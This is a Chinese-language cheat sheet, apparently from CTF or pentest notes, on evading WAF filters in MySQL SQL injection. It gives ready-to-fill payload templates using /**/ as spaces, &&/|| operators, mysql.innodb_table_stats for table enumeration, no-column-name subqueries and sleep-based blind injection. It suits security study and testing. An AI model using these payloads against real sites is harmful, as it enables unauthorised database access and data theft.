# SQL 注入过滤绕过：/**/ 顶空格、替代表、无列名注入

**一句话**：WAF 把空格、`or`/`and`、`information_schema` 等过滤后，用 `/**/` 当空格、`&&`/`||`
当 and/or、`mysql.innodb_table_stats` 当 information_schema，最后用「无列名注入」读列数据。

## 触发信号

- 详情/查询接口的 id 参数单引号闭合后有报错/回显差异。
- fuzz 发现空格、`or`、`and`、`information_schema` 等关键词被过滤。
- **注意**：`information_schema` 被过滤，往往就是因为它**含 `or` 子串**（inf**or**mation_schema），
  不是被单独点名——所以换一个不含 or 的替代表就行。

## 套路（能 union 回显就优先 union，别一上来就时间盲注）

1. **空格** → `/**/`（也可试 `%09` tab、`%0a` 换行、括号 `(1)`）。
2. **and / or** → `&&` / `||`（URL 里编码成 `%26%26` / `%7c%7c`）。
3. **先试 union 回显**：`1'/**/union/**/select/**/1,2,3,.../**/` 看哪个位置回显；报「列数不同」就
   用 `order/**/by N` 或 `group/**/by N` 二分凑列数。
4. **拿表名（information_schema 被过滤时）** → 用 `mysql.innodb_table_stats`（有 `database_name`、
   `table_name` 两列），模板：
   `1'/**/union/**/select/**/1,group_concat(table_name),3,...,N/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='库名'&&'1'='1`
   （N = 上一步试出的列数，回显位放 group_concat）。
5. **无列名注入**（拿到表名但拿不到列名）：把未知列名映射成别名再选，如
   `select \`2\` from (select 1,2,3 union select * from users) a` —— 内层把 users 的列重命名成
   1/2/3，外层按 `\`2\`` 取第 2 列。
6. **实在没有 union 回显位**，才退回时间盲注 `if((select ...)>0,sleep(5),0)`，但会慢很多。

## 坑

- `mysql.innodb_table_stats` 的 `database_name` 是库名、`table_name` 是表名；先拿表名，再无列名读列。
- union 的列数必须和原查询列数一致，否则报错。
- 逐层确认报错/回显变化再推进，别一次塞太多绕过。

